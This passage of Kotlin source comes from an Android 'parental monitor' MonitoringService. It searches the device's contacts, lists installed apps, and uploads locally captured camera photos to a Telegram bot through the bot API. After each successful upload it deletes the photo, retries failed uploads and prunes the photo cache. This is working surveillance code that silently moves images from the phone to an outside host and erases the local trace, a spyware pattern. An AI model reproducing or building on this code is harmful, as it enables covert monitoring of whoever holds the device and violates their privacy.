                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
            )
            val cursor = contentResolver.query(
                uri,
                projection,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ?",
                arrayOf("%$query%"),
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            cursor?.use { c ->
                val nameIdx = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (c.moveToNext() && out.size < 10) {
                    out.add((c.getString(nameIdx) ?: "") to (c.getString(numIdx) ?: ""))
                }
            }
        } catch (_: Exception) {
        }
        return out
    }

    private fun listLaunchableApps(limit: Int): List<String> {
        return try {
            val intent = android.content.Intent(android.content.Intent.ACTION_MAIN).addCategory(android.content.Intent.CATEGORY_LAUNCHER)
            packageManager.queryIntentActivities(intent, 0).mapNotNull { r ->
                try {
                    r.loadLabel(packageManager)?.toString()
                } catch (_: Exception) {
                    null
                }
            }.distinct().sortedBy { it.lowercase() }.take(limit)
        } catch (_: Exception) {
            emptyList()
        }
    }

    private fun dirSize(dir: File): Long {
        return try {
            dir.walkTopDown().filter { it.isFile }.sumOf { f ->
                try {
                    f.length()
                } catch (_: Exception) {
                    0L
                }
            }
        } catch (_: Exception) {
            0L
        }
    }

    private fun formatBytes(bytes: Long): String {
        if (bytes < 1024) return "$bytes B"
        val kb = bytes / 1024.0
        if (kb < 1024) return String.format(java.util.Locale.US, "%.1f KB", kb)
        val mb = kb / 1024.0
        if (mb < 1024) return String.format(java.util.Locale.US, "%.1f MB", mb)
        return String.format(java.util.Locale.US, "%.2f GB", mb / 1024.0)
    }

    private suspend fun sendPhotoFile(photoFile: File): Boolean {
        try {
            if (!hasNetwork()) {
                android.util.Log.w("MonitoringService", "No network - photo saved for later")
                return false
            }

            val (botToken, chatId) = sendCreds()

            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.e("MonitoringService", "Bot credentials missing")
                return false
            }

            val requestFile = photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
            val photoPart = MultipartBody.Part.createFormData("photo", photoFile.name, requestFile)
            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())

            val timestamp = TimeFmt.full(System.currentTimeMillis())
            val caption = "📸 $timestamp".toRequestBody("text/plain".toMediaTypeOrNull())

            val url = "https://api.telegram.org/bot$botToken/sendPhoto"

            val response = TelegramClient.api.sendPhoto(url, chatIdBody, caption, photoPart)

            if (response.isSuccessful && response.body()?.ok == true) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
                preferencesManager.lastSyncTime = System.currentTimeMillis()
                preferencesManager.lastPhotoTime = System.currentTimeMillis()
                secureDelete(photoFile)
                return true
            }
            val errorBody = try {
                response.errorBody()?.string()?.take(200) ?: ""
            } catch (e: Exception) {
                ""
            }
            if (response.code() == 429) {
                android.util.Log.w("MonitoringService", "Photo rate limited, keeping file for retry")
            } else if (response.code() == 400 || response.code() == 401 || response.code() == 403) {
                android.util.Log.e("MonitoringService", "Photo auth rejected (${response.code()}), dropping file")
                try {
                    preferencesManager.credentialError = response.code().toString()
                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                } catch (_: Exception) {
                }
                secureDelete(photoFile)
            } else {
                android.util.Log.e("MonitoringService", "✗ Failed to send photo: ${response.code()} $errorBody")
                notifyPhotoSendFailure("HTTP ${response.code()} $errorBody".trim())
            }
            return false
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Error sending photo to Telegram", e)
            return false
        }
    }

    private suspend fun flushPendingPhotos(max: Int = 10) {
        val pending = try {
            cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.sortedBy { it.lastModified() }?.take(max) ?: return
        } catch (e: Exception) {
            return
        }
        for (file in pending) {
            if (!sendPhotoFile(file)) break
            kotlinx.coroutines.delay(500)
        }
        prunePhotoCache()
    }

    private fun secureDelete(file: File) {
        try {
            file.delete()
        } catch (_: Exception) {
        }
    }
    private fun prunePhotoCache(maxKept: Int = 10) {
        try {
            val photos = cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.sortedBy { it.lastModified() } ?: return
            photos.drop(maxKept).forEach { secureDelete(it) }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error pruning photo cache", e)
        }
    }
}
